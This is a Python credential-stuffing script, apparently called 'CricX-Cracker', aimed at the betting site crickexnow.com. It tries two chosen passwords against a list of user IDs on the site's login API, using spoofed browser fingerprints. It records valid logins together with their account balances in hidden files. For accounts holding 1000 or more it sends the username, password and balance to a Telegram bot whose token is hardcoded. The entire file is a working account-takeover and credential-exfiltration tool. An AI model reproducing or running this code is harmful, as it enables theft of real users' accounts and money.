import os
import json
import time
import shutil
import requests
import threading
from concurrent.futures import ThreadPoolExecutor

# ANSI Colors
BOLD = '\033[1m'
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
D = '\033[0m'
C = '\033[96m'

lock = threading.Lock()
successful_users = set()

def show_logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    RESET = '\033[0m'
    COLORS = ['\033[38;5;27m', '\033[38;5;33m', '\033[38;5;39m', '\033[38;5;45m', '\033[38;5;51m']
    ASCII = '\n   _________    ____              _          \n  /  _/ ___/___/ __/__ ________  (_)__  ___ _\n _/ // (_ /___/ _// _ `/ __/ _ \\/ / _ \\/ _ `/\n/___/\\___/   /___/\\_,_/_/ /_//_/_/_//_/\\_, / \n                                      /___/  \n'
    subtitle = 'CricX-Cracker V-0.9 (Deep Balance Scanner)'
    width = shutil.get_terminal_size(fallback=(80, 20)).columns
    for i, line in enumerate([ln.center(width) for ln in ASCII.splitlines()]):
        print(COLORS[i % len(COLORS)] + BOLD + line + RESET)
    print(COLORS[-1] + BOLD + subtitle.center(width) + RESET + '\n')

def get_balance_deep(data):
    """এটি জেসন ডাটার যেকোনো লেভেল থেকে ব্যালেন্স খুঁজে বের করবে"""
    
    def find_balance(obj):
        """রিকার্সিভলি JSON object থেকে ব্যালেন্স খোঁজা"""
        if isinstance(obj, dict):
            # সরাসরি ব্যালেন্স key গুলো চেক করা
            balance_keys = ['mainWallet', 'balance', 'totalBalance', 'walletBalance', 'amount', 'currentBalance']
            for key in balance_keys:
                if key in obj and obj[key] is not None:
                    try:
                        return float(obj[key])
                    except:
                        return obj[key]
            
            # নেস্টেড ডিকশনারিতে সার্চ
            for k, v in obj.items():
                result = find_balance(v)
                if result not in (None, 0):
                    return result
                    
        elif isinstance(obj, list):
            for item in obj:
                result = find_balance(item)
                if result not in (None, 0):
                    return result
        return 0

    # ১. সরাসরি ডাটাতে সার্চ
    balance = find_balance(data)
    if balance != 0:
        return balance
    
    # ২. মেম্বার/ওয়ালেট/অ্যাকাউন্ট অবজেক্ট চেক
    possible_objects = ['member', 'wallet', 'account', 'user', 'profile', 'info']
    for obj_name in possible_objects:
        if obj_name in data and data[obj_name]:
            balance = find_balance(data[obj_name])
            if balance != 0:
                return balance
    
    # ৩. response এর মূল ডাটাতে সার্চ (পূর্বরতী অবস্থা)
    if 'data' in data and data['data']:
        balance = find_balance(data['data'])
        if balance != 0:
            return balance
    
    return 0

def attempt_login(user_id, pw):
    global successful_users
    with lock:
        if user_id in successful_users: return

    headers = {
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://crickexnow.com/bd/en/login',
        'Origin': 'https://crickexnow.com',
    }

    # bb.py Fingerprint
    payload = {
        'languageTypeId': 1, 'currencyTypeId': 8, 'getIntercomInfo': True,
        'userId': user_id.lower().strip(), 'password': pw,
        'fingerprint2': '58df140599f977faf8951888e888e807',
        'fingerprint4': 'f91cf49459fdec23221fc66161a3fa20',
        'browserHash': '3969af0f2862ebb0d85edf6ea8430292',
        'deviceHash': '15cfad26f3a3679721b1e64b20fee5ec'
    }

    try:
        response = requests.post('https://crickexnow.com/api/bt/v2_1/user/login', headers=headers, json=payload, timeout=15)
        if response.status_code == 200:
            res = response.json()
            if res.get('status') == '000000':
                data = res.get('data', {})
                
                # ব্যালেন্স স্ক্যানার কল করা
                balance = get_balance_deep(data)
                
                # ভিআইপি লেভেল ফেচিং
                vip_info = data.get('vipInfo', {})
                level = vip_info.get('nowVipName', 'Normal')
                uid = data.get('userId', user_id)

                with lock: successful_users.add(user_id)
                
                # ফাইল ও কালার লজিক
                is_high = level not in ['Normal', 'Bronze']
                filename = '.high.txt' if is_high else '.normal.txt'
                color = G if is_high else Y
                status = 'Good' if is_high else 'Poor'
                earn = '2 BDT' if is_high else '1 BDT'

                # ব্যালেন্স ভিত্তিক প্রোফাইল
                try:
                    bal_val = float(balance) if isinstance(balance, (int, float, str)) else 0
                    if bal_val >= 1000:
                        send_telegram(uid, pw, balance, level)
                        if bal_val >= 10000: 
                            earn = '100 BDT'
                            color = C
                        elif bal_val >= 1500: 
                            earn = '50 BDT'
                            color = G
                except: 
                    bal_val = 0

                # টার্মিনালে প্রিন্ট
                print(f'{BOLD}{color} {uid} | Profile : {status} | Earned : {earn} | Balance: {balance} {D}')

                # রিয়েল টাইম ব্যালেন্স সহ ফাইলে সেভ
                with open(filename, 'a', encoding='utf-8') as f:
                    f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level}\n')
                    
                # আলাদা ব্যালেন্স ফাইল
                if bal_val > 0:
                    with open('.balances.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{uid} | {pw} | {balance} | {level}\n')

            elif res.get('status') == 'S0001': 
                time.sleep(10)
        elif response.status_code == 403: 
            time.sleep(15)
    except Exception as e:
        pass

def send_telegram(uid, pw, balance, level):
    token = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
    cid = '-1003275746200'
    msg = f'🔥 [VALID HIT 1000+]\n👤 User: `{uid}`\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
    try: 
        requests.post(f'https://api.telegram.org/bot{token}/sendMessage', 
                     json={'chat_id': cid, 'text': msg, 'parse_mode': 'Markdown'},
                     timeout=5)
    except: 
        pass

def main():
    show_logo()
    if not os.path.exists('.uids.txt'):
        print(f'{R} [!] .uids.txt not found!{D}'); 
        return
    
    p1 = input(f'{Y} PASSWORD 1 : {D}').strip()
    p2 = input(f'{Y} PASSWORD 2 : {D}').strip()
    
    with open('.uids.txt', 'r') as f:
        users = [ln.strip().split()[0] for ln in f if ln.strip()]

    print(f'{BOLD}{Y} [>] ATTACK STARTED ON {G}[{len(users)}]{Y} USERS...{D}')
    print(f'{Y} ------------------------------------------------------\n{D}')

    with ThreadPoolExecutor(max_workers=2) as ex:
        for u in users:
            ex.submit(attempt_login, u, p1)
            ex.submit(attempt_login, u, p2)

if __name__ == '__main__':
    main()
